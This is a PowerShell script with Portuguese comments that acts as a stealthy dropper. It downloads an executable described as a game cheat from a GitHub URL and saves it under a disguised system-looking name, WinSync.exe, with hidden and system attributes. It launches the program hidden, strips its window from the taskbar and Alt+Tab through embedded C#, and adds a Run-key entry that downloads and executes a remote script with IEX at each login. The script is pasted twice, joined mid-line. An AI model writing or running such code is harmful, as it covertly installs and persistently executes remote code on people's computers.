$hideCode = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
public class WindowHider {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]
    public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
    [DllImport("user32.dll")]
    public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

    public static void Hide(int pid) {
        try {
            Process p = Process.GetProcessById(pid);
            IntPtr hWnd = p.MainWindowHandle;
            if (hWnd != IntPtr.Zero) {
                ShowWindow(hWnd, 0); // SW_HIDE
                int WS_EX_TOOLWINDOW = 0x00000080;
                int WS_EX_APPWINDOW = 0x00040000;
                int GWL_EXSTYLE = -20;
                int exStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
                exStyle = (exStyle | WS_EX_TOOLWINDOW) & ~WS_EX_APPWINDOW;
                SetWindowLong(hWnd, GWL_EXSTYLE, exStyle);
            }
        } catch { }
    }
}
"@

Add-Type -TypeDefinition $hideCode -Language CSharp

# Baixa o cheat
$url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
$path = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $path)
Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)

# Inicia o processo escondido
$p = Start-Process -FilePath $path -WindowStyle Hidden -PassThru

# Espera 2 segundos para o cheat abrir a janela dele
Start-Sleep -Seconds 2

# Arranca a janela da Barra e do Alt+Tab
[WindowHider]::Hide($p.Id)

# Persistência atualizada (chama o próprio script para rodar no boot)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$cmd = "powershell -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/suprazxx/yoxmenu/refs/heads/main/sync.ps1')`""
Set-ItemProperty -Path $regPath -Name "WinSyncClient" -Value $cmd$hideCode = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
public class WindowHider {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]
    public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
    [DllImport("user32.dll")]
    public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

    public static void Hide(int pid) {
        try {
            Process p = Process.GetProcessById(pid);
            IntPtr hWnd = p.MainWindowHandle;
            if (hWnd != IntPtr.Zero) {
                ShowWindow(hWnd, 0); // SW_HIDE
                int WS_EX_TOOLWINDOW = 0x00000080;
                int WS_EX_APPWINDOW = 0x00040000;
                int GWL_EXSTYLE = -20;
                int exStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
                exStyle = (exStyle | WS_EX_TOOLWINDOW) & ~WS_EX_APPWINDOW;
                SetWindowLong(hWnd, GWL_EXSTYLE, exStyle);
            }
        } catch { }
    }
}
"@

Add-Type -TypeDefinition $hideCode -Language CSharp

# Baixa o cheat
$url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
$path = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $path)
Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)

# Inicia o processo escondido
$p = Start-Process -FilePath $path -WindowStyle Hidden -PassThru

# Espera 2 segundos para o cheat abrir a janela dele
Start-Sleep -Seconds 2

# Arranca a janela da Barra e do Alt+Tab
[WindowHider]::Hide($p.Id)

# Persistência atualizada (chama o próprio script para rodar no boot)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$cmd = "powershell -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/suprazxx/yoxmenu/refs/heads/main/sync.ps1')`""
Set-ItemProperty -Path $regPath -Name "WinSyncClient" -Value $cmd
